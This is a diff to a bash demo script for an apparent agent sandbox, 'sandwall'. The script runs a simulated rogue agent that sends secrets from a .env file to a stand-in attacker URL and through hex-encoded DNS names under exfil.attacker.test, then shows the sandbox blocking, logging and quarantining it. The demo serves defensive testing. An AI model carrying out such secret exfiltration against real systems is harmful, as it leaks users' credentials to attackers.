@@ -28,6 +28,8 @@ OPEN_NS=demo-open
 ORIG_FWD=$(sysctl -n net.ipv4.ip_forward)
 
 if [[ -t 1 ]]; then BOLD=$'\e[1m' RED=$'\e[31m' GREEN=$'\e[32m' DIM=$'\e[2m' RESET=$'\e[0m'; else BOLD= RED= GREEN= DIM= RESET=; fi
+# abbrev shortens the hex-encoded secret in DNS names: 4f50454e41495f4150...exfil.attacker.test
+abbrev() { sed -E 's/([0-9a-f]{18})[0-9a-f]{12,}\./\1.../g'; }
 step() { printf '\n%s== %s%s\n' "$BOLD" "$*" "$RESET"; }
 note() { printf '%s%s%s\n' "$DIM" "$*" "$RESET"; }
 
@@ -57,7 +59,7 @@ EOF
 cp "$DEMO_DIR/agent.py" "$T/work/agent.py"
 chmod 755 "$T/work"
 chmod 644 "$T/work/.env" "$T/work/agent.py"
-AGENT=(python3 "$T/work/agent.py" --env "$T/work/.env" --url "http://$ATTACKER_IP:$ATTACKER_PORT/collect")
+AGENT=(python3 -u "$T/work/agent.py" --env "$T/work/.env" --url "http://$ATTACKER_IP:$ATTACKER_PORT/collect")
 as_nobody=(setpriv --reuid=65534 --regid=65534 --clear-groups --inh-caps=-all --bounding-set=-all --no-new-privs --)
 
 "$SANDWALL" "${G[@]}" nuke >/dev/null
@@ -87,16 +89,17 @@ EOF
 mkdir -p "/etc/netns/$OPEN_NS"
 echo "nameserver $ATTACKER_IP" >"/etc/netns/$OPEN_NS/resolv.conf"
 : >"$ATTACKER_LOOT"
-ip netns exec "$OPEN_NS" "${as_nobody[@]}" "${AGENT[@]}"
+ip netns exec "$OPEN_NS" "${as_nobody[@]}" "${AGENT[@]}" | abbrev
 note "attacker received:"
 if [[ -s "$ATTACKER_LOOT" ]]; then
-	printf '%s' "$RED"; sed 's/^/    /' "$ATTACKER_LOOT"; printf '%s' "$RESET"
+	printf '%s' "$RED"; grep -v '^$' "$ATTACKER_LOOT" | sed 's/^/    /' | abbrev; printf '%s' "$RESET"
 	printf '%s=> secrets exfiltrated%s\n' "$RED$BOLD" "$RESET"
 fi
 
 # A signed webhook receiver on loopback, standing in for a SOC endpoint, and
 # the demo policy with alerts to it.
 HOOKS="$T/hooks.jsonl"
+: >"$HOOKS"
 HOOK_SECRET="demo-$(head -c16 /dev/urandom | xxd -p)"
 printf '%s\n' "$HOOK_SECRET" >"$T/hook.key"
 python3 "$DEMO_DIR/../test/e2e/webhook.py" --port 18081 --out "$HOOKS" --secret "$HOOK_SECRET" >/dev/null 2>&1 &
@@ -105,18 +108,31 @@ HOOK_PID=$!
 domains=$(awk '/^  allow_domains:/ {f = 1; next} /^  [a-z_]+:/ {f = 0} f && /^    - /' "$DEMO_DIR/policy.yaml" | wc -l)
 deny_log() {
 	"$SANDWALL" "${G[@]}" logs agent --deny-only |
-		jq -r '"    \(.ts[11:23])  \(.type)  \(.verdict)/\(.reason // "-")" + (
+		jq -r '"    \(.ts[11:23])  \(.type)  \(.verdict)/\(.reason // "-" | sub(" \\(last: .*\\)$"; ""))" + (
 			if .qname then "  \(.qtype) \(.qname)"
 			elif .type == "quarantine" then ""
 			elif .type == "relay" then "  \(.proto) \(.dst_ip):\(.dst_port) sni=\(.sni // "-")"
 			else "  \(.proto) \(.dst_ip):\(.dst_port)" end)'
+}
+# collapse folds runs of identical events (retransmits, resolver retries) into
+# the first one with a count; the timestamp is the first 16 columns.
+collapse() {
+	awk 'function out() { print pl (n > 1 ? "  (x" n ")" : "") }
+		{ k = substr($0, 17) } NR > 1 && k == pk { n++; next }
+		NR > 1 { out() } { pl = $0; pk = k; n = 1 } END { if (NR) out() }'
+}
+# hooks_settled waits until no webhook delivery has arrived for 3s (the
+# dispatcher batches for up to 2s).
+hooks_settled() {
+	local n=-1
+	while [[ "$n" != "$(wc -l <"$HOOKS")" ]]; do n=$(wc -l <"$HOOKS"); sleep 3; done
 }
 
 step "(b) sandwall sandbox: default deny, allowlist $domains domains"
 start_daemon --webhook "soc=http://127.0.0.1:18081/hook" --webhook-secret "soc=$T/hook.key" || exit 1
 "$SANDWALL" "${G[@]}" sandbox create agent --policy "$T/policy.yaml"
 : >"$ATTACKER_LOOT"
-"$SANDWALL" "${G[@]}" sandbox exec agent -- "${AGENT[@]}"
+"$SANDWALL" "${G[@]}" sandbox exec agent -- "${AGENT[@]}" | abbrev
 sleep 1
 note "attacker received:"
 if [[ -s "$ATTACKER_LOOT" ]]; then
@@ -127,7 +143,7 @@ fi
 printf '    (nothing)\n%s=> nothing left the sandbox%s\n' "$GREEN$BOLD" "$RESET"
 
 note "sandwall logs agent --deny-only:"
-deny_log
+deny_log | collapse | abbrev
 seen=$(deny_log | wc -l)
 note "metrics (curl :9464/metrics):"
 curl -s http://127.0.0.1:19464/metrics | grep -E '^sandwall_(denied_total|dns_queries_total)\{.*sandbox="agent"' | sed 's/^/    /'
@@ -136,16 +152,18 @@ step "the agent can still do its job"
 code=$("$SANDWALL" "${G[@]}" sandbox exec agent -- curl -sS -m 20 -o /dev/null -w '%{http_code}' https://pypi.org/simple/requests/ 2>&1)
 printf '    curl https://pypi.org/simple/requests/ -> %s\n' "$code"
 
+hooks_settled
+hooks_seen=$(wc -l <"$HOOKS")
 step "(c) the agent escalates"
-"$SANDWALL" "${G[@]}" sandbox exec agent -- "${AGENT[@]}" --escalate
+"$SANDWALL" "${G[@]}" sandbox exec agent -- "${AGENT[@]}" --escalate | abbrev
 sleep 1
 note "sandwall logs agent --deny-only (new lines):"
-deny_log | tail -n +$((seen + 1))
+deny_log | tail -n +$((seen + 1)) | collapse | abbrev
 note "sandwall sandbox list:"
 "$SANDWALL" "${G[@]}" sandbox list | awk 'NR == 1 || $1 == "agent" {print "    " $1, $4}' | column -t | sed 's/^/    /'
 note "webhook soc received (signature checked):"
-jq -r '"    \(if .ok then "signature ok " else "BAD SIGNATURE" end)  " +
-	([.body.events[] | "\(.type)/\(if .type == "quarantine" then .verdict else .reason // .verdict end)"] | group_by(.) | map("\(.[0]) x\(length)") | join(", "))' "$HOOKS"
+tail -n +$((hooks_seen + 1)) "$HOOKS" | jq -r '"    \(if .ok then "signature ok " else "BAD SIGNATURE" end)  " +
+	([.body.events[] | "\(.type)/\(if .type == "quarantine" then .verdict else .reason // .verdict end)"] | group_by(.) | map("\(.[0]) x\(length)") | join(", "))'
 note "the same allowlisted fetch, now from the quarantined sandbox:"
 code=$("$SANDWALL" "${G[@]}" sandbox exec agent -- curl -sS -m 5 -o /dev/null -w '%{http_code}' https://pypi.org/simple/requests/ 2>/dev/null)
 printf '    curl https://pypi.org/simple/requests/ -> %s\n' "$code"
